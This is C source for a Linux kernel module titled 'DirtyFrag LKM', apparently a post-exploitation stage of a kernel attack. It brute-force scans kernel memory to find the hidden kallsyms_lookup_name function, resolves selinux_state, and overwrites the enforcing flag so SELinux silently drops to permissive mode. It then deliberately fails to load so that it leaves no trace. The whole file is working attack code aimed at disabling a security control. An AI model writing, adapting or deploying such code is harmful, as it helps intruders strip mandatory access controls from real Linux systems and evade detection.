#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("polygraphene");
MODULE_DESCRIPTION("DirtyFrag LKM");

extern int sprint_symbol(char *buffer, unsigned long address);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

static unsigned long sprint_symbol_addr = (unsigned long)&sprint_symbol;

static unsigned long (*kln_addr)(const char *name);

#define SCAN_STRIDE	4UL
#define SCAN_MAX	(4UL * 1024UL * 1024UL / SCAN_STRIDE) /* 1M iters, 4 MB */

static int name_is(const char *buf, const char *want)
{
	int i;

	for (i = 0; want[i]; i++) {
		if (buf[i] != want[i])
			return 0;
	}
	/* exact function start: name must be followed by "+0x0/" */
    return buf[i] == '+' && buf[i + 1] == '0' && buf[i + 2] == 'x' &&
	       buf[i + 3] == '0' && buf[i + 4] == '/';
}

static unsigned long scan_one_dir(unsigned long start, int dir)
{
	static char buf[256];
	unsigned long a;
	unsigned long i;

	for (i = 0; i < SCAN_MAX; i++) {
		if (dir < 0) {
			if (start < (i + 1) * SCAN_STRIDE)
				break;
			a = start - (i + 1) * SCAN_STRIDE;
		} else {
			a = start + (i + 1) * SCAN_STRIDE;
		}
		memset(buf, 0, sizeof(buf));
		sprint_symbol(buf, a);
		if (name_is(buf, "kallsyms_lookup_name"))
			return a;
	}
	return 0;
}

static int __init dirtyfrag_init(void)
{
	char buf[256];
	unsigned long anchor = sprint_symbol_addr;
	unsigned long found = 0;
	unsigned long sstate;

	/* Self-check: the anchor must resolve to sprint_symbol itself. */
	memset(buf, 0, sizeof(buf));
	sprint_symbol(buf, anchor);
	if (!name_is(buf, "sprint_symbol")) {
		pr_err("dirtyfrag: anchor self-check failed (%s), aborting\n", buf);
		return -ENODEV;
	}

	/* Down first (mirrors original), then up for layout robustness. */
	found = scan_one_dir(anchor, -1);
	if (!found)
		found = scan_one_dir(anchor, +1);
	if (!found) {
		pr_err("dirtyfrag: kallsyms_lookup_name not in scan window, aborting\n");
		return -ENODEV;
	}
	kln_addr = (kallsyms_lookup_name_t)found;
	sstate = kln_addr("selinux_state");
	if (!sstate) {
		pr_err("dirtyfrag: selinux_state unresolved, aborting\n");
		return -ENODEV;
	}
	/* struct selinux_state.enforcing is the first field; one NUL byte. */
	*(volatile unsigned char *)sstate = 0;

	pr_info("dirtyfrag: Successfully set selinux permissive.\n");
	/* Return random error to unload module. */
	return -E2BIG;
}

/* No module_exit: we never unload; saves .exit sections. */
module_init(dirtyfrag_init);
